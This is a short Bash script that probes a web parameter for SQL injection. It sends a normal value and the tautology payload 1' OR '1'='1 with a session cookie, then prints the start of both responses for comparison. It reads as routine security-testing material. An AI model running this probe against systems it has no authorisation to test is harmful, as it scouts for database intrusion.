#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${1:?usage: $0 BASE_URL PATH PARAM SESSION_FILE}"
PATH_PART="${2:?}"
PARAM="${3:?}"
SESSION_FILE="${4:?}"

normal_value="1"
test_value="1' OR '1'='1"

curl -sS -b "$SESSION_FILE" -G "${BASE_URL}${PATH_PART}" --data-urlencode "${PARAM}=${normal_value}" -o /tmp/sqli001_normal.html -w "normal_http=%{http_code}\n"
curl -sS -b "$SESSION_FILE" -G "${BASE_URL}${PATH_PART}" --data-urlencode "${PARAM}=${test_value}" -o /tmp/sqli001_test.html -w "test_http=%{http_code}\n"

echo '--- normal body (head) ---'
head -c 500 /tmp/sqli001_normal.html || true
echo
echo '--- test body (head) ---'
head -c 500 /tmp/sqli001_test.html || true
echo
